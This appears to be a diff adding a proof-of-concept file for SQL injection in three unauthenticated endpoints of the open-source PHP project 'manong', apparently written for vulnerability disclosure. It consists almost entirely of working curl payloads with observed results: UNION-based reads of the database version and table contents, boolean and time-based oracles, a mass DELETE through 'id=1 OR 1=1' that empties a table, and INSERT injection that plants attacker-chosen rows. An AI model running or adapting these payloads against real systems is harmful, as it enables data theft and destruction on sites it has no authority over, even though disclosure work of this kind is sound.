@@ -1,0 +1,30 @@
+manong SQL Injection PoC (CWE-89) - three unauthenticated endpoints
+Target: https://github.com/nemoTyrant/manong commit 7c9e522 (see TARGET-SOURCE.txt)
+All payloads are harmless examples (version()/database()/1=1/1=2/SLEEP(4)/group_concat of public categories).
+
+=== [1] a=crawl - UNION-based full read via POST number (func.php:264) =======================
+# extraction with full response echo:
+curl -d 'number=0 UNION SELECT 1,version(),database(),4,5,6-- -' 'http://<MANONG-HOST>/index.php?a=crawl'
+# => rendered page contains value='8.0.39' (version()) and value='manong' (database())
+curl -d 'number=0 UNION SELECT 1,group_concat(category),3,4,5,6 FROM issue-- -' 'http://<MANONG-HOST>/index.php?a=crawl'
+# => value='PHP,PYTHON' (issue table contents echoed)
+# boolean oracle:
+curl -d 'number=1 AND 1=1' 'http://<MANONG-HOST>/index.php?a=crawl'   # => 1 rendered item
+curl -d 'number=1 AND 1=2' 'http://<MANONG-HOST>/index.php?a=crawl'   # => 0 items (falls through to crawler failure)
+
+=== [2] a=del - boolean/time-based SQLi + mass DELETE via GET id (func.php:275) ==============
+curl 'http://<MANONG-HOST>/index.php?a=del&id=3 AND 1=1'      # => {"res":1}
+curl 'http://<MANONG-HOST>/index.php?a=del&id=3 AND 1=2'      # => {"res":0}
+# time-based:
+time curl 'http://<MANONG-HOST>/index.php?a=del&id=1 AND SLEEP(4)'   # => ~5s (control: 0s)
+# arbitrary mass delete (verified 3 rows -> 0 in the DB; re-seed rows before running):
+curl 'http://<MANONG-HOST>/index.php?a=del&id=1 OR 1=1'       # => {"res":1}, cache table emptied
+
+=== [3] a=add - INSERT injection via GET parameters (func.php:350-352) ======================
+# subquery executed, result stored in an attacker-chosen column:
+curl 'http://<MANONG-HOST>/index.php?a=add&title=x%27,%27d%27,(select%20version()),%271%27,%27C%27,%270%27,0,0)--%20-'
+# => {"res":1,...}; DB row: title=x, desc=d, href='8.0.39' (version() landed in href)
+# fully attacker-controlled row:
+curl 'http://<MANONG-HOST>/index.php?a=add&title=x3%27,%27ANYDESC%27,%27http://evil%27,%27777%27,%27EVIL%27,%27AAAA%27,0,0)--%20-'
+# => {"res":1,...}; DB row id=6: x3 / ANYDESC / http://evil / 777 / EVIL
+#    (server-side md5()/time() fields overridden inside the injected payload)
